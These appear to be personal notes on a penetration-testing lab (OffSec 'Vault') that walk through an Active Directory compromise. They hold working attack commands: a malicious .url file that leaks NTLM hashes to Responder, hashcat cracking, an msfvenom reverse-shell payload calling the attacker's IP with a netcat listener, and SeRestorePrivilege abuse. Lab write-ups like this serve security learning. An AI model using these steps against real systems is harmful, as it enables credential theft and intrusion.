Messing with nxc command 

```
nxc smb 192.168.120.172 -u '.' -p '.' --shares
```
![[PG/Active Directory/attachments/Pasted image 20250707235059.png]]
- gives me a guest authentication but still can't see shares 

### SMBMAP 

```
smbmap -u '' -H 192.168.120.172
```

![[PG/Active Directory/attachments/Pasted image 20250707235227.png]]
- nothing

```
smbmap -u '.' -H 192.168.120.172
```

![[PG/Active Directory/attachments/Pasted image 20250707235302.png]]
- Something ðŸ‘€
- See a DocumentShare

Read share contents

```
smbmap -u '.' -H 192.168.120.172 -r DocumentsShare --depth 10
```

![[PG/Active Directory/attachments/Pasted image 20250707235627.png]]
- looks like there is nothing in this share
- but we do have write access.. could I write something?

Confirm nothing here with smbclient 

```
smbclient -U '.' //192.168.120.172/DocumentsShare
```

# Back to SMB 

Exploiting the SMB Put file share functionality by creating malicious icon file that will call back to our machines and leak NTLM creds.. we'll use responder to catch the NTLM hash.

Paste the below code into a file called â€˜Evil.urlâ€™

```
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\192.168.45.152\%USERNAME%.icon
IconIndex=1
```

Start responder 

![[PG/Active Directory/attachments/Pasted image 20250708003110.png]]

Log back in with smbclient 

```
smbclient -U '.' //192.168.120.172/DocumentsShare
```

Put evil.url on the share and check responder

Wooooooooooooooo
![[PG/Active Directory/attachments/Pasted image 20250708003340.png]]

Got a hash :) and a user: `anirudh`

Save hash to a file to crack.

# Crack NTLMv2 

```
hashcat -m 5600 ani.hash /usr/share/wordlists/rockyou.txt --force
```

And it cracked 

![[PG/Active Directory/attachments/Pasted image 20250708003722.png]]
- `anirudh:SecureHM`

# Initial Access

```
nxc winrm 192.168.120.172 -u 'anirudh' -p 'SecureHM'
```

![[PG/Active Directory/attachments/Pasted image 20250708003944.png]]

# Priv Esc 

We have a lot of interesting privileges (including the SeMachineAccountPrivilege)
![[PG/Active Directory/attachments/Pasted image 20250708004215.png]]

Maybe my trusty script will work again.....DOUBT 

## Priv Esc by Exploiting SeMachineAccountPrivilege

```
python3 noPac.py vault.offsec/anirudh:'SecureHM' -dc-ip 192.168.120.172 -shell --impersonate administrator -use-ldap
```

![[PG/Active Directory/attachments/Pasted image 20250708004537.png]]
- as expected.. did not work.

## SeBackupPrivilege 

This one is a goodie.. maybe we can save reg keys.

![[PG/Active Directory/attachments/Pasted image 20250708004932.png]]

Got some hashes
![[PG/Active Directory/attachments/Pasted image 20250708004951.png]]

BOOOO

So only our user can access the box remotely 

```
net localgroup 'Remote Desktop Users'

Try to exploit the SeRestorePrivilege

# Priv Esc via SeRestorePrivilege 

Download this executable from GitHub https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------

Here is the usage 

![[PG/Active Directory/attachments/Pasted image 20250708010452.png]]

Generate a rev shell with msfvenom 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=1234 -f exe -o reverse.exe
```

Upload these two files to the box

Set up nc listener 

```
sudo rlwrap nc -lvnp 1234
```

```
.\SeRestoreAbuse.exe C:\Users\anirudh\Desktop\reverse.exe
```
